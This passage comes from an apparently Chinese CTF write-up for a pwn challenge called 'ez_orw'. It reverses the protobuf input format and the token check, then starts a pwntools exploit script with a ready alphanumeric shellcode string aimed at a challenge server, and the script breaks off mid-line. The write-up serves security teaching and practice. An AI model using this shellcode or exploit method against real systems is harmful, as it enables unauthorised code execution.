class="number">0x28</span>u);</span><br><span class="line">  sub_16FE(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;DO U love xiao/a/giao?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%llx&quot;</span>, v3);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)v3[<span class="number">0</span>] == <span class="string">&quot;yes&quot;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give you a replacement egg&quot;</span>);</span><br><span class="line">      sub_1D96();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I won&#x27;t even give you eggs to replenish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;dword_5008);</span><br><span class="line">    <span class="keyword">if</span> ( dword_5008 &lt;= <span class="number">255</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, &amp;dword_5008);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先要输入一个地址，这个地址的值上的值是yes，之后就会进入一个真正的主function</p><p>然后输入一个<code>&amp;dd_5008</code>只要满足<code>&lt;=255</code>，就会泄露一个地址，然后就能完成上面的条件了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1D96</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  _BYTE buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your giao: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  qword_5058 = sub_218D(<span class="number">0LL</span>, v1, buf);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_5058 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your giao is error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_19A1(*(_QWORD *)(qword_5058 + <span class="number">64</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(qword_5058 + <span class="number">24</span>) == <span class="number">1131796LL</span> &amp;&amp; *(_QWORD *)(qword_5058 + <span class="number">32</span>) == <span class="number">4281361LL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1908(*(_QWORD *)(qword_5058 + <span class="number">48</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*(_QWORD *)(qword_5058 + <span class="number">40</span>));</span><br><span class="line">      sub_17CC();</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(qword_5058 + <span class="number">40</span>) &lt; (<span class="type">unsigned</span> __int64)dword_5008 &amp;&amp; v1 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, *(<span class="type">const</span> <span class="type">void</span> **)(qword_5058 + <span class="number">48</span>), *(_QWORD *)(qword_5058 + <span class="number">40</span>));</span><br><span class="line">        ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过简单分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000004B20 ; ===========================================================================</span><br><span class="line">.data.rel.ro:0000000000004B20</span><br><span class="line">.data.rel.ro:0000000000004B20 ; Segment type: Pure data</span><br><span class="line">.data.rel.ro:0000000000004B20 ; Segment permissions: Read/Write</span><br><span class="line">.data.rel.ro:0000000000004B20 _data_rel_ro    segment align_32 public &#x27;DATA&#x27; use64</span><br><span class="line">.data.rel.ro:0000000000004B20                 assume cs:_data_rel_ro</span><br><span class="line">.data.rel.ro:0000000000004B20                 ;org 4B20h</span><br><span class="line">.data.rel.ro:0000000000004B20 stru_4B20       ProtobufCFieldDescriptor &lt;offset aGiaoid, 1, 3, 3, 0, 18h, 0, 0, 0, 0,\</span><br><span class="line">.data.rel.ro:0000000000004B20                                         ; DATA XREF: .data.rel.ro:stru_4C40↓o ; &quot;giaoid&quot;</span><br><span class="line">.data.rel.ro:0000000000004B20                                           0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004B68                 ProtobufCFieldDescriptor &lt;offset aGiaosize, 2, 3, 3, 0, 20h, 0, 0, 0, \ ; &quot;giaosize&quot;</span><br><span class="line">.data.rel.ro:0000000000004B68                                           0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004BB0                 ProtobufCFieldDescriptor &lt;offset aGiaocontent, 3, 3, 0Fh, 0, 28h, 0, \ ; &quot;giaocontent&quot;</span><br><span class="line">.data.rel.ro:0000000000004BB0                                           0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004BF8                 ProtobufCFieldDescriptor &lt;offset aGiaotoken, 4, 3, 0Fh, 0, 38h, 0, 0, \ ; &quot;giaotoken&quot;</span><br><span class="line">.data.rel.ro:0000000000004BF8                                           0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004C40 stru_4C40       ProtobufCMessageDescriptor &lt;28AAEEF9h, offset aGiaoMsgiao, \</span><br><span class="line">.data.rel.ro:0000000000004C40                                         ; DATA XREF: sub_2004+5B↑o</span><br><span class="line">.data.rel.ro:0000000000004C40                                         ; sub_206C+17↑o ...</span><br><span class="line">.data.rel.ro:0000000000004C40                                             offset aMsgiao, offset aGiaoMsgiao_0, \ ; &quot;giao.msgiao&quot;</span><br><span class="line">.data.rel.ro:0000000000004C40                                             offset aGiao, 48h, 4, offset stru_4B20, \ ; &quot;Msgiao&quot;</span><br><span class="line">.data.rel.ro:0000000000004C40                                             offset unk_3110, 1, offset unk_3120, \</span><br><span class="line">.data.rel.ro:0000000000004C40                                             2004h, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>定义.proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">devicemsg</span>&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int64</span> giaoid = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int64</span> giaosize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">bytes</span> giaocontent = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">bytes</span> giaotoken = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过上述ida结构体的定义可以得到以下的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1D96</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  _BYTE buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your giao: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  giao_message = (_Devicemsg *)unpack(<span class="number">0LL</span>, v1, (__int64)buf);</span><br><span class="line">  <span class="keyword">if</span> ( !giao_message )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your giao is error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_19A1((<span class="type">const</span> <span class="type">char</span> *)giao_message-&gt;giaotoken.data)</span><br><span class="line">    &amp;&amp; giao_message-&gt;giaoid == <span class="number">1131796</span></span><br><span class="line">    &amp;&amp; giao_message-&gt;giaosize == <span class="number">4281361</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1908(giao_message-&gt;giaocontent.data, (<span class="type">unsigned</span> <span class="type">int</span>)giao_message-&gt;giaocontent.len);</span><br><span class="line">    sub_17CC();</span><br><span class="line">    <span class="keyword">if</span> ( giao_message-&gt;giaocontent.len &lt; dword_5008 &amp;&amp; v1 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, giao_message-&gt;giaocontent.data, giao_message-&gt;giaocontent.len);</span><br><span class="line">      ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出是一个orw的shellcode的写入，shellcode的内容就是content的内容，其中长度要小于之前写入<code>dd_5008</code>的值且小于0x100，但是token和giaoid，giaosize都要满足相对应的值，才能进入相应的分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_19A1</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-258h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-254h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-250h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-248h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+30h] [rbp-240h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-238h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+40h] [rbp-230h]</span></span><br><span class="line">  _QWORD v10[<span class="number">32</span>]; <span class="comment">// [rsp+50h] [rbp-220h] BYREF</span></span><br><span class="line">  _WORD v11[<span class="number">12</span>]; <span class="comment">// [rsp+150h] [rbp-120h] BYREF</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+168h] [rbp-108h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+170h] [rbp-100h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+178h] [rbp-F8h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+180h] [rbp-F0h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+188h] [rbp-E8h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+190h] [rbp-E0h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+198h] [rbp-D8h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+1A0h] [rbp-D0h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+1A8h] [rbp-C8h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+1B0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+1B8h] [rbp-B8h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+1C0h] [rbp-B0h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+1C8h] [rbp-A8h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+1D0h] [rbp-A0h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+1D8h] [rbp-98h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+1E0h] [rbp-90h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+1E8h] [rbp-88h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+1F0h] [rbp-80h]</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+1F8h] [rbp-78h]</span></span><br><span class="line">  __int64 v31; <span class="comment">// [rsp+200h] [rbp-70h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+208h] [rbp-68h]</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+210h] [rbp-60h]</span></span><br><span class="line">  __int64 v34; <span class="comment">// [rsp+218h] [rbp-58h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+220h] [rbp-50h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+228h] [rbp-48h]</span></span><br><span class="line">  __int64 v37; <span class="comment">// [rsp+230h] [rbp-40h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+238h] [rbp-38h]</span></span><br><span class="line">  __int64 v39; <span class="comment">// [rsp+240h] [rbp-30h]</span></span><br><span class="line">  __int64 v40; <span class="comment">// [rsp+248h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v41; <span class="comment">// [rsp+258h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v41 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)v11, <span class="string">&quot;114514giaogiaogiao99&quot;</span>);</span><br><span class="line">  HIBYTE(v11[<span class="number">10</span>]) = <span class="number">0</span>;</span><br><span class="line">  v11[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  v18 = <span class="number">0LL</span>;</span><br><span class="line">  v19 = <span class="number">0LL</span>;</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  v21 = <span class="number">0LL</span>;</span><br><span class="line">  v22 = <span class="number">0LL</span>;</span><br><span class="line">  v23 = <span class="number">0LL</span>;</span><br><span class="line">  v24 = <span class="number">0LL</span>;</span><br><span class="line">  v25 = <span class="number">0LL</span>;</span><br><span class="line">  v26 = <span class="number">0LL</span>;</span><br><span class="line">  v27 = <span class="number">0LL</span>;</span><br><span class="line">  v28 = <span class="number">0LL</span>;</span><br><span class="line">  v29 = <span class="number">0LL</span>;</span><br><span class="line">  v30 = <span class="number">0LL</span>;</span><br><span class="line">  v31 = <span class="number">0LL</span>;</span><br><span class="line">  v32 = <span class="number">0LL</span>;</span><br><span class="line">  v33 = <span class="number">0LL</span>;</span><br><span class="line">  v34 = <span class="number">0LL</span>;</span><br><span class="line">  v35 = <span class="number">0LL</span>;</span><br><span class="line">  v36 = <span class="number">0LL</span>;</span><br><span class="line">  v37 = <span class="number">0LL</span>;</span><br><span class="line">  v38 = <span class="number">0LL</span>;</span><br><span class="line">  v39 = <span class="number">0LL</span>;</span><br><span class="line">  v40 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)s = <span class="number">0xB95FA87BA6AF366A</span>LL;</span><br><span class="line">  v6 = <span class="number">0x918D1C0CC7837D63</span>LL;</span><br><span class="line">  v7 = <span class="number">0xF877F9B36B6EF2D3</span>LL;</span><br><span class="line">  v8 = <span class="number">0x8EFDECFCE888E2BF</span>LL;</span><br><span class="line">  v9 = <span class="number">1090425597</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)v11);</span><br><span class="line">  sub_1417(v10, v11, v1);</span><br><span class="line">  sub_15EC(v10, a1, v4, v11);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(a1, s) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看就是一个复杂的加解密过程，不过我简单分析得出giaotoken在这个解密中，不会因为giaotoken的改变而发生key的改变，且解密只是一个简单的异或操作，因此可以把<code>114514giaogiaogiao99</code>输入进去就能获得giaotoken</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505132037156.png" alt="image-20250513201404551" style="zoom:50%;" /><p>进入了最终分支之后，发现对shellcode的字节有做要求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1908</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 - <span class="number">1</span> + a1) == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 - <span class="number">1</span> + a1) = <span class="number">0</span>;</span><br><span class="line">    v3 = a2 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)((<span class="type">int</span>)i + a1) &lt;= <span class="string">&#x27;\x1F&#x27;</span> || *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="string">&#x27;\x7F&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oops!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能是小于<code>\x1F</code>和<code>\x7F</code>，那么AE64一把梭即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> giao_pb2</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./ez_orw&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line">ae64 = AE64()</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line">r64 =<span class="keyword">lambda</span>                         :u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#fmt(&#x27;%&#123;one_gadget &amp; 0xffff&#125;c&#x27;)</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;100.100.1.16&#x27;</span>,<span class="number">6498</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p = run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;giao?\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;replenish\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">yes_addr=<span class="built_in">int</span>(r(<span 